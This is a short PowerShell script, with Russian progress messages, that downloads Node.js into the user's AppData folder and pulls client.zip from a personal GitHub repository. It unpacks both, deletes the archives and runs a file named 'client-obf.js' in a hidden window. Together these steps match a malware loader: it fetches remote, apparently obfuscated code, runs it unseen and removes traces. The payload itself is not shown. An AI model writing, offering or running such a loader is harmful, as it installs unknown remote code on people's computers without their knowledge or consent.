$AppData = $env:APPDATA
$NodeZip = Join-Path $AppData "node.zip"
$ClientZip = Join-Path $AppData "client.zip"
$NodeDir = Join-Path $AppData "node-v22.19.0-win-x64"

Write-Host ">>> Скачиваем Node.js..."
Invoke-WebRequest -Uri "https://nodejs.org/dist/v22.19.0/node-v22.19.0-win-x64.zip" -OutFile $NodeZip

Write-Host ">>> Распаковываем Node.js..."
Expand-Archive -Path $NodeZip -DestinationPath $AppData -Force

Write-Host ">>> Скачиваем client.zip..."
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/DaleGelb/files/main/client.zip" -OutFile $ClientZip

Write-Host ">>> Распаковываем client.zip..."
Expand-Archive -Path $ClientZip -DestinationPath $NodeDir -Force

Write-Host ">>> Удаляем архивы..."
Remove-Item $NodeZip -Force
Remove-Item $ClientZip -Force

Write-Host ">>> Запускаем client-obf.js..."
Start-Process -FilePath (Join-Path $NodeDir "node.exe") -ArgumentList (Join-Path $NodeDir "client-obf.js") -WindowStyle Hidden
